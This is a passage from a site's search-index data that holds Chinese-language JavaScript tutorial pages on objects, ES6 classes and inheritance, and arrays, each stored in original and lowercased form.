是一种轻量级的数据交换格式。\n\n 1. 隐式创建(json格式创建)\n\nvar obj = {}\n\n\n 1. 实例化object\n\nvar obj=new object();\n\n\n 3. 实例化自定义构造函数\n\nfunction obj(a){ }\nvar obj = new obj();\n\n\n 4. 实例化类 (实例化object的语法糖，详见 class 一节)\n\nclass animal{}  \nvar dog=new animal();\n\n\n\n# new操作符具体做了什么？\n\nfunction base(){\n  this.name = \"zhangsan\";\n  this.age = 20;\n}\nvar obj = new base();\n\n// new操作符等价于\nvar obj = {};\nobj.__proto__ = base.prototype;\nbase.call(obj);\n\n\n 1. 创建了一个空对象obj\n 2. 将这个空对象的__proto__成员指向了base函数对象prototype成员对象。相当于obj拥有了base原型上的属性方法\n 3. 将base函数对象的this指针替换成obj，然后再调用base函数，于是就给obj对象赋值了一个name和age成员变量。相当于obj拥有了base构造函数上的属性方法\n\nvar this = object.create(peson.prototype);\n\n\n# instanceof关键字\n\n> 如果obj对象是构造函数fun的一个实例，则 obj instanceof fun 返回 true。\n\n判断一个数据是否是数组：\n\nvar arr1 = [], arr2 = {}\n\narr1 instanceof array   // true\narr2 instanceof array   // false\n\n\n\n# 对象的增、删、改、查\n\n\n# 1. 增 (给对象增加一个新的属性或方法)\n\n * 声明后赋值\n\nvar obj = {}\nobj.user = \"张三\";    // 属性\nobj.eat = function(){    // 方法\n  console.log('吃饭');\n}\n\n\n * 声明的同时赋值\n\n//json形式创建赋值\nvar obj={\n  name:'张三',\n  age:18,\n  eat:function(){\n    console.log('吃饭');\n  }\n}\n\n//实例化构造函数\nfunction animal(){\n  this.name='阿黄',\n  this.age='2',\n  this.sing=function(){\n    console.log('汪汪');\n  }\n}\n\n//实例化object\nvar obj=new object({a:'aa',b:'bb'})\n\n\n\n# 2. 查(访问属性、方法)\n\n * 访问属性\n\n对象.属性名;\n对象[\"属性名\"];\n\n\n * 访问方法\n\n对象.方法名();\n对象[\"方法名\"]();\n\n\n> 注：当属性名或方法名保存到变量中时，访问该属性或方法需要使用[]\n\nfor(let i in obj){\n  obj[i]     // i是存储属性名的变量，所以访问该属性时必须通过[]\n}\n\n\n\n# 3. 改(修改属性和方法)\n\n> 直接为属性或方法赋新值即可\n\n对象.属性名=新的属性值;\n对象.方法名=新的方法;\n\n\n\n# 4. 删(删除对象或者对象上的属性方法)\n\n * 销毁对象\n\n> javascript中的垃圾回收机制在对象没有引用的时候会进行销毁，释放内存\n\n对象=null;    \n\n\n * 删除对象上的属性和方法，使用delete运算符\n\nvar obj={\n  a:'a',\n  b:function(){console.log('这是一个方法')}\n}\ndelete obj.a;   //删除obj对象上的a属性    \ndelete obj.b;   //删除obj对象上的b方法\n\n\n\n# 对象的遍历\n\n 1. for in 循环\n\n> 循环遍历对象自身的和继承的可枚举属性(不含symbol属性).\n\nvar obj={\n  name:'小米',\n  age:18,\n  say:function(){\n    console.log('你好');\n  }\n}\nfor (var i in obj) {\n  console.log(obj[i]);\n}\n\n\n> es6其余遍历方式详见 object对象一节\n\n\n# 对象的拷贝\n\n由于对象是引用类型，变量中存储的是数据的地址，所以对象直接通过=赋值只能将地址赋值而不是数据。\n\n对象的拷贝分为浅拷贝、深拷贝：\n\nvar obj = {\n  type: \"animal\",\n  cat:{\n    name:\"tom\",\n    weight: 16,\n    food:[\"fish\",\"meat\"]\n  },\n}\n\n\n * 浅拷贝： 直接拷贝对象的内存地址，如果原地址中对象被改变了，那么浅拷贝出来的对象也会相应改变\n * 深拷贝： 新开辟一块内存，将对象中所有属性全部复制，如果原地址中对象被改变了，那么深拷贝出来的对象不变\n\n深拷贝实现方法：\n\n 1. 递归遍历，逐层拷贝。 因为基础类型可以直接拷贝，所以通过递归遍历对象的每一层，全部得到基础类型后再拷贝。\n 2. 通过json.stringify()先将对象转化为字符串，字符串赋值后再通过json.parse()转化回对象。\n\n方案1：\n\nvar obj = {\n    id:1000,\n    name:\"张三\",\n    age:19,\n    favs:['足球','电影','游戏','篮球']\n}\nvar obj2 = json.parse(json.stringify(obj));\n\n\n方案2:\n\n/**\n * [deepcopy 深拷贝]\n * @param  {[array|object]}   [要拷贝对象或数组]\n * @return {[array|object]}   [返回拷贝对象或数组]\n */\nfunction deepcopy(o){\n\tif(array.isarray(o)){\n\t\tvar result = [];\n\t}else if(typeof o == 'object'){\n\t\tvar result = {};\n\t}else{\n\t\treturn o;\n\t}\n\tfor(var i in o){\n\t\tif(typeof o[i]== 'object'){\n\t\t\tresult[i] = deepcopy(o[i])\n\t\t}else{\n\t\t\tresult[i] = o[i];\n\t\t}\n\t}\n\treturn result;\n}\n\n\n> 在拷贝日期正则等特殊对象是拷贝为空对象。如有需求加判断就可以解决。\n\n\n# this\n\n> this是一个很特别的关键字，被自动定义在所有函数的作用域中。\n> this总是会指向一个对象。或者说，this就是属性或方法‘当前’所在的对象。\n\n\n# this的指向\n\n> this的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定this到底指向谁，实际上this的最终指向的是那个调用它的对象\n\n 1. 在普通函数中this指window全局对象\n 2. 作为对象方法调用，this 指代调用该方法对象\n 3. 在构造函数中this指向构造函数的实例\n 4. 在事件中，this指向事件源\n 5. 在call和apply中,this指的是方法中传入的对象，如果apply中没有传对象，this指向window\n\nfunction fun(){\n  run(){\n    console.log(this)       // this指向实例化出的对象，因为是实例化出的对象调用了run方法\n\n    setinterval(_=>{\n      conosle.log(this)     // this指向 window，因为是window调用了setinterval方法\n    })\n  }\n}\n\n\n\n# 改变this的指向\n\ncall() apply() bind() 在对象的特性中会讲到\n\n\n# es6对象扩展\n\n\n# 属性方法的简洁表示法\n\n当属性名为变量名, 属性值为变量的值时，可直接将变量作为对象的属性：\n\nlet username = \"张三\"\n\nlet obj = {\n  username,      // 属性名为变量名, 属性值为变量的值\n  age: 20\n}\n\n\n * 对象方法的简写：\n\nlet obj = {\n  run:function(){\n    alert(1)\n  }\n}\n// 简写为：\nlet obj = {\n  run(){\n    alert(1)\n  }\n}\n\n\n这种写法用于函数的返回值，将会非常方便。\n\nfunction getpoint() {\n  const x = 1;\n  const y = 10;\n  return {x, y};\n}\n\ngetpoint()\n\n\n\n# 对象的解构赋值\n\n解构不仅可以用于数组，还可以用于对象。\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\n\nlet { first: f, last: l } = { first: 'hello', last: 'world' };\nf // 'hello'\nl // 'world'\n\n\n> 上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。\n\n如果变量名与属性名一致，可以写成下面这样:\n\nlet { foo, bar } = { foo: \"aaa\", bar: \"bbb\" };\nfoo // \"aaa\"\nbar // \"bbb\"\n\n\n对象的解构与数组有一个重要的不同。数组的元素是按次序排列的，变量的取值由它的位置决定；而对象的属性没有次序，变量必须与属性同名，才能取到正确的值。\n\n如果变量名与属性名不一致，必须写成下面这样。\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\n\nlet obj = { first: 'hello', last: 'world' };\nlet { first: f, last: l } = obj;\nf // 'hello'\nl // 'world'\n\n\n也就是说，对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\nfoo // error: foo is not defined\n// 上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。\n\n\n与数组一样，解构也可以用于嵌套结构的对象。\n\nlet obj = {\n  p: [\n    'hello',\n    { y: 'world' }\n  ]\n};\n\nlet { p: [x, { y }] } = obj;\nx // \"hello\"\ny // \"world\"\n\n\n注意，这时p是模式，不是变量，因此不会被赋值。如果p也要作为变量赋值，可以写成下面这样。\n\nlet obj = {\n  p: [\n    'hello',\n    { y: 'world' }\n  ]\n};\n\nlet { p, p: [x, { y }] } = obj;\nx // \"hello\"\ny // \"world\"\np // [\"hello\", {y: \"world\"}]\n\nconst node = {\n  loc: {\n    start: {\n      line: 1,\n      column: 5\n    }\n  }\n};\n\nlet { loc, loc: { start }, loc: { start: { line }} } = node;\nline // 1\nloc  // object {start: object}\nstart // object {line: 1, column: 5}\n\n\n默认值 对象的解构也可以指定默认值。\n\nvar {x = 3} = {};\nx // 3\n\nvar {x, y = 5} = {x: 1};\nx // 1\ny // 5\n\nvar {x: y = 3} = {};\ny // 3\n\nvar {x: y = 3} = {x: 5};\ny // 5\n\nvar { message: msg = 'something went wrong' } = {};\nmsg // \"something went wrong\"\n\n\n * 用途1：接收函数的参数\n\n// 接收被除数x与除数y\nfunction calc({dividend: x, dividend: y}){\n  return x/y\n}\nlet divide = calc({dividend:9,dividend:3})\n\n\n * 用途2：接收函数的返回值\n\nfunction calc(a,b){\n  return {\n    add: a+b,\n    subtract: a-b,\n    multiply: a*b,\n    divide: a/b\n  }\n}\n// 相对于返回数组来讲，不需要知道返回值参数的顺序\nlet {add, subtract, multiply, divide} = calc(1,2)\n\n\n\n# 对象的rest属性\n\nes6中数组的rest和扩展运算符，用于数组于普通参数之间的转化\n\nmath.max(...[1,2,3,4])\n\nfunction fun(a,b,...c){ }\n\n\n现在在es9中，当对象结构复制时也可以使用rest运算符：\n\nlet obj = {a: 1, b: 2, c: 3};\nlet {a,...x}\n//  a == 1\n//  x == {b: 2, c: 3}\n\n\n或在函数参数中也可以使用：\n\nrestparam({\n  a: 1,\n  b: 2,\n  c: 3\n});\n\nfunction restparam({ a, ...x }) {\n  // a = 1\n  // x = { b: 2, c: 3 }\n}\n",charsets:{cjk:!0}},{title:"class（类）",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/03-class.html",relativePath:"Javascript/Javascript基础语法/07-对象/03-class.md",key:"v-3b75c570",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/03-class.html",headers:[{level:2,title:"类的定义",slug:"类的定义",normalizedTitle:"类的定义",charIndex:88},{level:2,title:"Class的继承",slug:"class的继承",normalizedTitle:"class的继承",charIndex:2453},{level:3,title:"基本用法",slug:"基本用法",normalizedTitle:"基本用法",charIndex:2466}],headersStr:"类的定义 Class的继承 基本用法",content:"# class（类）\n\n> ES6引入了 Class（类）这个概念，作为对象的模板。通过class关键字，可以定义类。类在大部分功能其实可以通过ES6之前的语法实现。\n\n\n# 类的定义\n\nES6 的类，完全可以看作构造函数的另一种写法。\n\nclass People {\n  constructor(name,age) {\n    this.name = name;\n    this.age = age;\n  }\n  //属性放在constructor方法中\n  toString() {\n    return this.name+'今年'+this.age;\n  }\n}\ntypeof People   //function\n\n\n * constructor方法默认返回实例对象（即this），完全可以指定返回另外一个对象。\n   \n   class Foo {\n     constructor() {\n       return Object.create(null);\n     }\n   }\n   \n   console.log(new Foo() instanceof Foo)  // false\n   \n\n * 类的构造函数，不使用new是没法调用的，会报错。这是它跟普通构造函数的一个主要区别，后者不用new也可以执行。\n   \n   class Foo {\n     constructor() {\n       return Object.create(null);\n     }\n   }\n   \n   Foo()  //报错： Class constructor Foo cannot be invoked without 'new'\n   \n\n * 实例的属性除非显式定义在其本身（即定义在this对象上），否则都是定义在原型上（即定义在class上）\n   \n   class Point {\n     constructor(x, y) {\n       this.x = x;\n       this.y = y;\n     }\n     toString() {\n       return '(' + this.x + ', ' + this.y + ')';\n     }\n   }\n   \n   var point = new Point(2, 3);\n   point.toString()                 // (2, 3)\n   point.hasOwnProperty('x')        // true\n   point.hasOwnProperty('y')        // true\n   point.hasOwnProperty('toString') // false\n   point.__proto__.hasOwnProperty('toString') // true\n   \n\n * 不存在变量提升：ES6不会把类的声明提升到代码头部。这种规定的原因与下文要提到的继承有关，必须保证子类在父类之后定义。\n   \n   new Foo(); // ReferenceError\n   class Foo {}\n   \n\n * Class表达式\n   \n   * 与函数一样，类也可以使用表达式的形式定义。\n     \n     const MyClass = class Me {\n       getClassName() {\n         return Me.name;\n       }\n     };\n     //这个类的名字是MyClass而不是Me，Me只在Class的内部代码可用，指代当前类\n     \n   \n   * 采用Class表达式，可以写出立即执行的Class。\n     \n     let person = new class {\n       constructor(name) {\n         this.name = name;\n       }\n       sayName() {\n         console.log(this.name);\n       }\n     }('张三');\n     \n     console.log(person.sayName()); // \"张三\"  undefined\n     \n\n * 静态方法\n   \n   * 静态方法只有类本身和他的子类可以调用，实例化的对象不可以调用\n\nclass P{\n\tstatic pF(){\n\t\tconsole.log('父类静态方法');\n\t}\n}\nclass C extends P{\n}\nvar p1=new P();\nP.pF();              //父类静态方法\nC.pF();               //父类静态方法\np1.pF();             //p1.pF is not a function\n\n\n静态方法可以直接通过类调用，不要要生成实例，它的主要作用方便我们使用(Math对象上的方法)\n\n * 私有方法\n   * 私有方法是常见需求，但ES6不提供，只能通过变通方法模拟实现。\n   使用symbol设置\n\nconst bar = Symbol('bar');\nconst snaf = Symbol('snaf');\nexport default class myClass{\n  // 公有方法\n  foo(baz) {\n    this[bar](baz);\n  }\n  // 私有方法\n  [bar](baz) {\n    return this[snaf] = baz;\n  }\n // ...\n};\n\n\nbar和snaf都是Symbol值，导致第三方无法获取到它们，因此达到了私有方法和私有属性的效果。\n\n\n\n# Class的继承\n\n\n# 基本用法\n\n * Class之间可以通过extends关键字实现继承\n   \n   class ColorPoint extends Point {\n     constructor(x, y, color) {\n       super(x, y); // 调用父类的constructor(x, y)\n       this.color = color;\n     }\n     toString() {\n       return this.color + ' ' + super.toString(); // 调用父类的toString()\n     }\n   }\n   \n\n * 类的 prototype 属性和 _proto_ 属性\n\n> 每一个对象都有__proto__属性，指向对应的构造函数的prototype属性。Class作为构造函数的语法糖，同时有prototype属性和__proto__属性，因此同时存在两条继承链。\n\n * 子类的__proto__属性，表示构造函数的继承，总是指向父类。\n   \n * 子类prototype属性的__proto__属性，表示方法的继承，总是指向父类的prototype属性。\n\nclass A {\n}\nclass B extends A {\n}\nB.__proto__ === A // true\nB.prototype.__proto__ === A.prototype // true\n\n\n * Extends 的继承目标\n\n> extends关键字后面可以跟多种类型的值。\n\nclass B extends A {\n\n}\n\n\n> 上面代码的A，只要是一个有prototype属性的函数，就能被B继承。由于函数都有prototype属性（除了Function.prototype函数），因此A可以是任意函数。\n\n下面我们叙述三种特殊情况：\n\n * 第一种特殊情况，子类继承Object类。\n\n class A extends Object {\n\n }\n A.__proto__ === Object // true\n A.prototype.__proto__ === Object.prototype // true\n ```\n 这种情况下，A其实就是构造函数Object的复制，A的实例就是Object的实例。\n\n* 第二种特殊情况，不存在任何继承。\n\n ```javascript\n class A {\n\n }\n A.__proto__ === Function.prototype // true\n A.prototype.__proto__ === Object.prototype // true\n ```\n 这种情况下，A作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承Funciton.prototype。但是，A调用后返回一个空对象（即Object实例），所以A.prototype.\\__proto__指向构造函数（Object）的prototype属性。\n\n* 第三种特殊情况，子类继承null。\n\n ```javascript\n class A extends null {\n\n }\n A.\\__proto__ === Function.prototype // true\n A.prototype.\\__proto__ === undefined // true\n ```\n 这种情况与第二种情况非常像。A也是一个普通函数，所以直接继承Funciton.prototype。但是，A调用后返回的对象不继承任何方法，所以它的__proto__指向Function.prototype，即实质上执行了下面的代码。\n\n ```javascript\n class C extends null {\n     constructor() { return Object.create(null); }\n }\n ```\n",normalizedContent:"# class（类）\n\n> es6引入了 class（类）这个概念，作为对象的模板。通过class关键字，可以定义类。类在大部分功能其实可以通过es6之前的语法实现。\n\n\n# 类的定义\n\nes6 的类，完全可以看作构造函数的另一种写法。\n\nclass people {\n  constructor(name,age) {\n    this.name = name;\n    this.age = age;\n  }\n  //属性放在constructor方法中\n  tostring() {\n    return this.name+'今年'+this.age;\n  }\n}\ntypeof people   //function\n\n\n * constructor方法默认返回实例对象（即this），完全可以指定返回另外一个对象。\n   \n   class foo {\n     constructor() {\n       return object.create(null);\n     }\n   }\n   \n   console.log(new foo() instanceof foo)  // false\n   \n\n * 类的构造函数，不使用new是没法调用的，会报错。这是它跟普通构造函数的一个主要区别，后者不用new也可以执行。\n   \n   class foo {\n     constructor() {\n       return object.create(null);\n     }\n   }\n   \n   foo()  //报错： class constructor foo cannot be invoked without 'new'\n   \n\n * 实例的属性除非显式定义在其本身（即定义在this对象上），否则都是定义在原型上（即定义在class上）\n   \n   class point {\n     constructor(x, y) {\n       this.x = x;\n       this.y = y;\n     }\n     tostring() {\n       return '(' + this.x + ', ' + this.y + ')';\n     }\n   }\n   \n   var point = new point(2, 3);\n   point.tostring()                 // (2, 3)\n   point.hasownproperty('x')        // true\n   point.hasownproperty('y')        // true\n   point.hasownproperty('tostring') // false\n   point.__proto__.hasownproperty('tostring') // true\n   \n\n * 不存在变量提升：es6不会把类的声明提升到代码头部。这种规定的原因与下文要提到的继承有关，必须保证子类在父类之后定义。\n   \n   new foo(); // referenceerror\n   class foo {}\n   \n\n * class表达式\n   \n   * 与函数一样，类也可以使用表达式的形式定义。\n     \n     const myclass = class me {\n       getclassname() {\n         return me.name;\n       }\n     };\n     //这个类的名字是myclass而不是me，me只在class的内部代码可用，指代当前类\n     \n   \n   * 采用class表达式，可以写出立即执行的class。\n     \n     let person = new class {\n       constructor(name) {\n         this.name = name;\n       }\n       sayname() {\n         console.log(this.name);\n       }\n     }('张三');\n     \n     console.log(person.sayname()); // \"张三\"  undefined\n     \n\n * 静态方法\n   \n   * 静态方法只有类本身和他的子类可以调用，实例化的对象不可以调用\n\nclass p{\n\tstatic pf(){\n\t\tconsole.log('父类静态方法');\n\t}\n}\nclass c extends p{\n}\nvar p1=new p();\np.pf();              //父类静态方法\nc.pf();               //父类静态方法\np1.pf();             //p1.pf is not a function\n\n\n静态方法可以直接通过类调用，不要要生成实例，它的主要作用方便我们使用(math对象上的方法)\n\n * 私有方法\n   * 私有方法是常见需求，但es6不提供，只能通过变通方法模拟实现。\n   使用symbol设置\n\nconst bar = symbol('bar');\nconst snaf = symbol('snaf');\nexport default class myclass{\n  // 公有方法\n  foo(baz) {\n    this[bar](baz);\n  }\n  // 私有方法\n  [bar](baz) {\n    return this[snaf] = baz;\n  }\n // ...\n};\n\n\nbar和snaf都是symbol值，导致第三方无法获取到它们，因此达到了私有方法和私有属性的效果。\n\n\n\n# class的继承\n\n\n# 基本用法\n\n * class之间可以通过extends关键字实现继承\n   \n   class colorpoint extends point {\n     constructor(x, y, color) {\n       super(x, y); // 调用父类的constructor(x, y)\n       this.color = color;\n     }\n     tostring() {\n       return this.color + ' ' + super.tostring(); // 调用父类的tostring()\n     }\n   }\n   \n\n * 类的 prototype 属性和 _proto_ 属性\n\n> 每一个对象都有__proto__属性，指向对应的构造函数的prototype属性。class作为构造函数的语法糖，同时有prototype属性和__proto__属性，因此同时存在两条继承链。\n\n * 子类的__proto__属性，表示构造函数的继承，总是指向父类。\n   \n * 子类prototype属性的__proto__属性，表示方法的继承，总是指向父类的prototype属性。\n\nclass a {\n}\nclass b extends a {\n}\nb.__proto__ === a // true\nb.prototype.__proto__ === a.prototype // true\n\n\n * extends 的继承目标\n\n> extends关键字后面可以跟多种类型的值。\n\nclass b extends a {\n\n}\n\n\n> 上面代码的a，只要是一个有prototype属性的函数，就能被b继承。由于函数都有prototype属性（除了function.prototype函数），因此a可以是任意函数。\n\n下面我们叙述三种特殊情况：\n\n * 第一种特殊情况，子类继承object类。\n\n class a extends object {\n\n }\n a.__proto__ === object // true\n a.prototype.__proto__ === object.prototype // true\n ```\n 这种情况下，a其实就是构造函数object的复制，a的实例就是object的实例。\n\n* 第二种特殊情况，不存在任何继承。\n\n ```javascript\n class a {\n\n }\n a.__proto__ === function.prototype // true\n a.prototype.__proto__ === object.prototype // true\n ```\n 这种情况下，a作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承funciton.prototype。但是，a调用后返回一个空对象（即object实例），所以a.prototype.\\__proto__指向构造函数（object）的prototype属性。\n\n* 第三种特殊情况，子类继承null。\n\n ```javascript\n class a extends null {\n\n }\n a.\\__proto__ === function.prototype // true\n a.prototype.\\__proto__ === undefined // true\n ```\n 这种情况与第二种情况非常像。a也是一个普通函数，所以直接继承funciton.prototype。但是，a调用后返回的对象不继承任何方法，所以它的__proto__指向function.prototype，即实质上执行了下面的代码。\n\n ```javascript\n class c extends null {\n     constructor() { return object.create(null); }\n }\n ```\n",charsets:{cjk:!0}},{title:"数组 （Array）",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84.html",relativePath:"Javascript/Javascript基础语法/06-数组/数组.md",key:"v-84ffdf68",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84.html",headers:[{level:2,title:"创建数组并赋值",slug:"创建数组并赋值",normalizedTitle:"创建数组并赋值",charIndex:111},{level:3,title:"创建数组",slug:"创建数组",normalizedTitle:"创建数组",charIndex:111},{level:3,title:"数组赋值",slug:"数组赋值",normalizedTitle:"数组赋值",charIndex:206},{level:2,title:"数组的访问",slug:"数组的访问",normalizedTitle:"数组的访问",charIndex:552},{level:3,title:"通过数组下标访问数据",slug:"通过数组下标访问数据",normalizedTitle:"通过数组下标访问数据",charIndex:562},{level:3,title:"数组的长度",slug:"数组的长度",normalizedTitle:"数组的长度",charIndex:698},{level:3,title:"数组的遍历",slug:"数组的遍历",normalizedTitle:"数组的遍历",charIndex:842},{level:2,title:"二维数组",slug:"二维数组",normalizedTitle:"二维数组",charIndex:1466},{level:2,title:"数组扩展",slug:"数组扩展",normalizedTitle:"数组扩展",charIndex:1636},{level:3,title:"[ES6] 数组的解构赋值",slug:"es6-数组的解构赋值",normalizedTitle:"[es6] 数组的解构赋值",charIndex:1645},{level:3,title:"[ES6]扩展运算符 ...",slug:"es6-扩展运算符",normalizedTitle:"[es6]扩展运算符 ...",charIndex:2972},{level:3,title:"Array.from",slug:"array-from",normalizedTitle:"array.from",charIndex:3601},{level:3,title:"Array.of()",slug:"array-of",normalizedTitle:"array.of()",charIndex:3926}],headersStr:"创建数组并赋值 创建数组 数组赋值 数组的访问 通过数组下标访问数据 数组的长度 数组的遍历 二维数组 数组扩展 [ES6] 数组的解构赋值 [ES6]扩展运算符 ... Array.from Array.of()",content:'# 数组 （Array）\n\n> 一个变量只能保存一个数据，当有一连串数据需要保存时就需要用到数组：\n\n数组 是一个可以存储一组或是一系列相关数据的容器。\n\n为什么要使用数组?\n解决大量相关数据的存储和使用的问题。\n\n\n# 创建数组并赋值\n\n\n# 创建数组\n\n实例化构造函数\n\nvar arr = new Array();\n\n\n隐式创建 (内部调用new Array())\n\nvar arr = [];\n\n\n\n# 数组赋值\n\n创建数组并赋值\n\nvar arr = new Array("a","b","c");   // [\'a\',\'b\',\'c\']\n\nvar arr = ["a","b","c"];\n\n\n创建数组后赋值\n数组中存储的是有序的数据，所以可根据数据所在位置的序号进行赋值，这个位置叫做下标\n语法：\n\n数组名[下标]\n\n\n示例\n\nvar arr = [];\narr[0]="a";\narr[1]="b";\narr[2]="c";\n// 上面的操作等价于  var arr = ["a","b","c"];\n\n\n# 赋值特点\n\n * 数组的下标是从 0 开始计算，arr[0]就是arr数组的第一个值\n * 数组中可是 以存储任意数据类型的数据，在一个数组中可以包含对象元素、函数、数组\n\n\n# 数组的访问\n\n\n# 通过数组下标访问数据\n\n * 访问数据：直接通过下标获取数组对应位置的值\n * 修改数据：直接将数据赋值给对应数组对应位置\n\n// 访问arr数组的第一个值\nvar one = arr[0];\n// 修改arr数字的第一个值为\'x\';\narr[0] = "x"\n\n\n\n# 数组的长度\n\n数组的长度即数组中存储数据的个数，数组上有一个length属性可用来访问数组的长度\n\nvar arr = [1,2,3,4,5];\narr.length   // 5\n\n\n数组最后一个数据的下标： length-1\n访问数组最后一个元素：arr[length-1]\n\n\n# 数组的遍历\n\n> 通过循环依次获取 0 到 length-1 的下标，即可实现遍历数组，访问所有数组数据\n\n# for循环遍历\n\nvar arr=[1,2,3];\nfor(var i=0;i<arr.length;i++){\n  console.log(arr[i]);\n}\n\n// 控制台输出\n> 1\n> 2\n> 3\n\n\n# for...in 循环\n\nvar arr = [1,2,3];\nfor(var i in arr){\n  // i 是数组下标\n  // arr[i] 是数组数据\n}\n\n\n> 但是最好不要用for in 循环来遍历数组，它是用来遍历对象的。如果在数组原型上添加方法，它也会遍历出来\n\n# [ES6]for...of 循环\n\nfor...of循环可以使用的范围包括数组、Set 和 Map 结构、某些类似数组的对象（比如arguments对象、DOM NodeList 对象），以及字符串。\n\nlet arr = [3, 5, 7];\narr.foo = \'hello\';\n\nfor (let i in arr) {\n  // i 值是键名\n  console.log(i); // "0", "1", "2", "foo"\n}\n\nfor (let i of arr) {\n  // i 值是键值，  并且只返回具有数字索引的属性\n  console.log(i);   //  "3", "5", "7"\n}\n\n\n\n# 二维数组\n\n> 数组中的每一个子元素都是数组\n\nvar arr = [[1,2,3],[4,5],[6]]\n\n\n遍历二维数组\n\nfor(var i =0; i<arr.length;i++){\n  for(var j =0; j<arr.length;j++){\n    console.log(arr[i][j])\n  }\n}\n\n\n\n# 数组扩展\n\n\n# [ES6] 数组的解构赋值\n\n> 从数组中提取值，对变量进行赋值，这被称为数组解构赋值。如果解构不成功，变量的值就等于undefined。\n\nvar [one, two, three] = [1,2,3];\nconsole.log(one); // 1\nconsole.log(two); // 2\nconsole.log(three); // 3\n\nlet [foo, [[bar], baz]] = [1, [[2], 3]];\nfoo // 1\nbar // 2\nbaz // 3\n\nlet [ , , third] = ["foo", "bar", "baz"];\nthird // "baz"\n\nlet [x, , y] = [1, 2, 3];\nx // 1\ny // 3\n\nlet [head, ...tail] = [1, 2, 3, 4];\nhead // 1\ntail // [2, 3, 4]\n\nlet [x, y, ...z] = [\'a\'];\nx // "a"\ny // undefined\nz // []\n\n\n为了防止从数组中取出一个值为undefined的对象，还可以为这个对象设置默认值。\n\nvar a, b;\n[a=5, b=7] = [1];\nconsole.log(a); // 1\nconsole.log(b); // 7\n\n\n注意，ES6 内部使用严格相等运算符（===），判断一个位置是否有值。所以，只有当一个数组成员严格等于undefined，默认值才会生效。 用途1： 不使用第三个变量交换两个变量的值。\n\nlet [x = 1] = [undefined];\nx // 1\n\nlet [x = 1] = [null];\nx // null\n\n// 上面代码中，如果一个数组成员是null，默认值就不会生效，因为null不严格等于undefined\n\n\n如果默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值。\n\nfunction f() {\n  console.log(\'aaa\');\n}\n\nlet [x = f()] = [1];\n\n\n上面代码中，因为x能取到值，所以函数f根本不会执行。上面的代码其实等价于下面的代码。\n\nlet x;\nif ([1][0] === undefined) {\n  x = f();\n} else {\n  x = [1][0];\n}\n\n\n默认值可以引用解构赋值的其他变量，但该变量必须已经声明。\n\nlet [x = 1, y = x] = [];     // x=1; y=1\nlet [x = 1, y = x] = [2];    // x=2; y=2\nlet [x = 1, y = x] = [1, 2]; // x=1; y=2\nlet [x = y, y = 1] = [];     // ReferenceError: y is not defined\n\n\nvar a = 1, b = 3;\n\n[a, b] = [b, a];\nconsole.log(a); // 3\nconsole.log(b); // 1\n\n\n\n# [ES6]扩展运算符 ...\n\n> 扩展运算符（spread）是三个点...。它好比 函数rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。\n\nconsole.log(...[1, 2, 3])        // 1 2 3\nconsole.log(1, ...[2, 3, 4], 5)  // 1 2 3 4 5\n\n\n# 用途\n\n1.函数调用传参\n\n// 将数组参数items转化为数字，从而进行push\nfunction push(array, ...items) {\narray.push(...items);\n}\n\n// 将数组中数据相加\nfunction add(x, y) {\nreturn x + y;\n}\nlet numbers = [4, 38];\nadd(...numbers) // 42\n\n// 寻找数组最值\nMath.max(...[numbers])    // 38\nMath.min(...[numbers])    // 4\n\n\n2.数组拷贝\n\nconst a1 = [1, 2];\n// 写法一\nconst a2 = [...a1];\n// 写法二\nconst [...a2] = a1;\n\n\n3.数组合并\n\nlet arr1 = [1,2,3], arr2 = [4,5,6];\nlet newarr = [...arr1, ...arr2]\n\n\n> 不过，这种方法是浅拷贝，使用的时候需要注意。\n\n\n# Array.from\n\n> Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）\n\nlet arrayLike = {\n    \'0\': \'a\',\n    \'1\': \'b\',\n    \'2\': \'c\',\n    length: 3\n};\n\n// ES5的写法\nvar arr1 = [].slice.call(arrayLike); // [\'a\', \'b\', \'c\']\n\n// ES6的写法\nlet arr2 = Array.from(arrayLike); // [\'a\', \'b\', \'c\']\n\n\n\n# Array.of()\n\n> Array.of()方法用于将一组值，转换为数组。\n\nArray.of(3, 11, 8) // [3,11,8]\nArray.of(3) // [3]\nArray.of(3).length // 1\n\n\n这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。\n\nArray() // []\nArray(3) // [, , ,]\nArray(3, 11, 8) // [3, 11, 8]\n',normalizedContent:'# 数组 （array）\n\n> 一个变量只能保存一个数据，当有一连串数据需要保存时就需要用到数组：\n\n数组 是一个可以存储一组或是一系列相关数据的容器。\n\n为什么要使用数组?\n解决大量相关数据的存储和使用的问题。\n\n\n# 创建数组并赋值\n\n\n# 创建数组\n\n实例化构造函数\n\nvar arr = new array();\n\n\n隐式创建 (内部调用new array())\n\nvar arr = [];\n\n\n\n# 数组赋值\n\n创建数组并赋值\n\nvar arr = new array("a","b","c");   // [\'a\',\'b\',\'c\']\n\nvar arr = 